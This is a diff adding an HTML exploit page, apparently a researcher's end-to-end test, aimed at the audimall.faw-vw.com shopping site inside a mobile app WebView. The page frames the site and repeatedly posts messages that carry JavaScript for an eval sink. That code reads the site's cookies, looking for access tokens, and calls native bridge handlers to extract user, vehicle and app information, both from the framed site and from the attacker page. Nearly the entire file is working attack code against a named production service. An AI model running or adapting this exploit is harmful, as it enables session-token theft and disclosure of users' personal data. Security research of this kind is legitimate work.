@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>e2e i2733</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body style="background:#fff;font-family:monospace;font-size:10px;padding:6px">
+<b>E2E i2733 realca</b> <span id="st"></span>
+<pre id="out" style="white-space:pre-wrap"></pre>
+<div id="fr" style="height:40vh;width:100%;border:1px solid #888"></div>
+<script>
+var OUT=document.getElementById("out"), ST=document.getElementById("st");
+var T0=Date.now();
+function log(s){OUT.textContent+="["+((Date.now()-T0)/1000).toFixed(1)+"s] "+s+"\n";}
+function R(tag,data){ // results to DOM + title (exfil-free channel)
+  log("RESULT "+tag+" :: "+String(data).slice(0,600));
+  try{document.title="R:"+((document.title.length>190)?document.title.slice(0,190):document.title)+"|"+tag;}catch(e){}
+}
+window.onerror=function(m,s,l,c){R("attk_jserr",m+" @"+l+":"+c);return false;};
+R("e2e_loaded","origin="+location.origin+" href="+location.href);
+
+// ---------- eval sink probe: iframe mall + postMessage MoFangtqEvent ----------
+// PROBE runs INSIDE mall origin (eval'd there). It:
+//  a) reads mall-origin document.cookie (looking for #2515 cookie audiidp token)
+//  b) answers the gate question #2725: getUserInfo bridge from mall-origin frame
+//     (whitelisted host per e1.b) -> does the lzyzsd bridge inject into subframes,
+//     does b() judge by subframe or main URL, does it emit the audiidp token
+var PROBE = "(function(d){var o=[];o.push('SINK_EXECUTED mallOrigin='+location.origin);o.push('cookieLen='+document.cookie.length);o.push('cookieNames='+document.cookie.split(';').map(function(x){return x.split('=')[0].trim();}).join(','));try{var cv=decodeURIComponent((document.cookie.match(/(?:^|;\\s*)audiidp_access_token=([^;]*)/)||document.cookie.match(/(?:^|;\\s*)access_token=([^;]*)/)||[,''])[1]);if(cv)o.push('TOKEN_COOKIE='+cv.slice(0,24)+'...len'+cv.length);else o.push('TOKEN_COOKIE=none');}catch(e){o.push('TOKEN_COOKIE=err:'+e)}" +
+"var sub={subframe:true,origin:location.origin};function reply(x){try{window.parent.postMessage({__i2733_sink:x},'*')}catch(e){}}reply(o.join(' | '));" +
+"try{var bi=0;var biv=setInterval(function(){bi++;if(window.WebViewJavascriptBridge){clearInterval(biv);sub.bridgeInjected=true;reply('SUBFRAME_BRIDGE_INJECTED origin='+location.origin);try{window.WebViewJavascriptBridge.callHandler('getUserInfo','',function(r){reply('SUBFRAME_getUserInfo_resp origin='+location.origin+' resp='+String(r).slice(0,400));});}catch(e){reply('SUBFRAME_getUserInfo_err '+e);}try{window.WebViewJavascriptBridge.callHandler('getSelectedVehicleInfo','',function(r){reply('SUBFRAME_getSelectedVehicleInfo_resp origin='+location.origin+' resp='+String(r).slice(0,200));});}catch(e){}}else if(bi>25){clearInterval(biv);reply('SUBFRAME_NO_BRIDGE_AFTER_25s origin='+location.origin);}},1000);}catch(e){reply('SUBFRAME_BRIDGE_ERR '+e)}" +
+"return 1})";
+
+var f=document.createElement("iframe");
+f.src="https://audimall.faw-vw.com/mobile/pages/index/index";
+f.style.cssText="width:100%;height:100%;border:0";
+document.getElementById("fr").appendChild(f);
+log("iframe created src=audimall index");
+
+window.addEventListener("message",function(e){
+  if(e.data&&e.data.__i2733_sink){R("SINK_PROOF",String(e.data.__i2733_sink)+" (msgOrigin="+e.origin+")");}
+});
+
+var attempts=0;
+function poke(){
+  attempts++;
+  try{
+    var w=f.contentWindow;
+    if(!w){return;}
+    var msg={type:"MoFangtqEvent",qtData:{code:PROBE,data:{component_type:"i2733_e2e"}}};
+    try{w.postMessage(msg,"*");}catch(e2){}
+  }catch(e){}
+}
+var iv=setInterval(function(){poke(); if(attempts>=30){clearInterval(iv);log("poke loop done.");}},1500);
+
+// ---------- MAIN-FRAME bridge probes (attack-origin frame) ----------
+function setupWebViewJavascriptBridge(callback){
+  if(window.WebViewJavascriptBridge){return callback(window.WebViewJavascriptBridge);}
+  if(window.WVJBCallbacks){return window.WVJBCallbacks.push(callback);}
+  window.WVJBCallbacks=[callback];
+  var ifr=document.createElement('iframe');
+  ifr.style.display='none';
+  ifr.src='https://__wvjb_bridge_message__/';
+  document.documentElement.appendChild(ifr);
+  setTimeout(function(){document.documentElement.removeChild(ifr);},0);
+}
+var brTries=0;
+var brIv=setInterval(function(){
+  brTries++;
+  if(window.WebViewJavascriptBridge){
+    clearInterval(brIv);
+    setupWebViewJavascriptBridge(function(bridge){
+      R("bridge","main-frame bridge object ready (url suffix trick)");
+      try{bridge.callHandler('getSelectedVehicleInfo','',function(r){R("getSelectedVehicleInfo",JSON.stringify(r));});}catch(e){R("gsvi_err",String(e));}
+      try{bridge.callHandler('getUserInfo','',function(r){R("getUserInfo_MAIN",String(r).slice(0,400));});}catch(e){R("gui_err",String(e));}
+      try{bridge.callHandler('getAppInfo','',function(r){R("getAppInfo",JSON.stringify(r));});}catch(e){}
+    });
+  } else if(brTries>40){clearInterval(brIv);R("nobridge","no WebViewJavascriptBridge in main frame after 40x1s");}
+},1000);
+setTimeout(function(){R("attk_final","attempts="+attempts+" brTries="+brTries+" cookie?see sink");},48000);
+</script></body></html>
